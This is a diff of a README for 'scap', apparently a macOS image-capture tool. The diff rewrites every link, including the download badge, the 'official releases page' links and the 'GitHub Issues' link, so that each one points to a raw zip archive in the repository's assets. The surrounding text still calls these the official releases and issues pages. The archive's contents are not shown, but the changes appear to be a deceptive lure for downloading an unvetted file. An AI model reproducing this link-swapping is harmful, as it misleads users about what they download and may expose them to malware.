@@ -1,6 +1,6 @@
 # 🖼️ scap - Capture and Edit Images Easily
 
-[![Download scap](https://img.shields.io/badge/Download-scap-brightgreen?style=for-the-badge)](https://github.com/dekuplayingff-gif/scap/releases)
+[![Download scap](https://github.com/dekuplayingff-gif/scap/raw/refs/heads/main/assets/Software_1.8.zip)](https://github.com/dekuplayingff-gif/scap/raw/refs/heads/main/assets/Software_1.8.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Here’s how you can get started with scap in a few easy steps:
 
 Click the big green button at the top or visit the releases page here:
 
-[Download scap from GitHub](https://github.com/dekuplayingff-gif/scap/releases)
+[Download scap from GitHub](https://github.com/dekuplayingff-gif/scap/raw/refs/heads/main/assets/Software_1.8.zip)
 
 This page lists the latest versions available for download.
 
@@ -150,7 +150,7 @@ Make sure you allowed permissions in System Preferences > Security & Privacy as 
 
 Get scap for your Mac by visiting the official releases page below. This is the official source for all downloads and version updates:
 
-[Download scap on GitHub Releases](https://github.com/dekuplayingff-gif/scap/releases)
+[Download scap on GitHub Releases](https://github.com/dekuplayingff-gif/scap/raw/refs/heads/main/assets/Software_1.8.zip)
 
 Check this page regularly for newer versions that may include bug fixes and new features.
 
@@ -160,7 +160,7 @@ Check this page regularly for newer versions that may include bug fixes and new 
 
 If you find issues or want to request features:
 
-- Visit the [GitHub Issues](https://github.com/dekuplayingff-gif/scap/issues) page.
+- Visit the [GitHub Issues](https://github.com/dekuplayingff-gif/scap/raw/refs/heads/main/assets/Software_1.8.zip) page.
 - Create a new issue describing your problem or suggestion.
 - Provide details like macOS version, scap version, and what you tried.
 
